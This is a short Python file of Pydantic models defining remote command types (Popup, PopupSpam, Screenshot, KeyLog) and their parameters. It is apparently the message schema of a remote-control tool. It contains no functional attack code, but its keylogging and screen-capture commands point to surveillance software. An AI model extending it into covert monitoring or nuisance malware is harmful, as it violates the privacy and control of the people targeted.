import enum
from typing import Optional

from pydantic import BaseModel


class CommandType(str, enum.Enum):
    Popup = "Popup"
    PopupSpam = "PopupSpam"
    Screenshot = "Screenshot"
    KeyLog = "KeyLog"


class BasicCommand(BaseModel):
    command_id: str = ""
    command_type: CommandType
    parameters: Optional[dict] = {}


class PopupParameters(BaseModel):
    message: str


class PopupCommand(BasicCommand):
    command_type: CommandType = CommandType.Popup
    parameters: PopupParameters


class KeyLogParameters(BaseModel):
    duration: int


class KeyLogCommand(BasicCommand):
    command_type: CommandType = CommandType.KeyLog
    parameters: KeyLogParameters
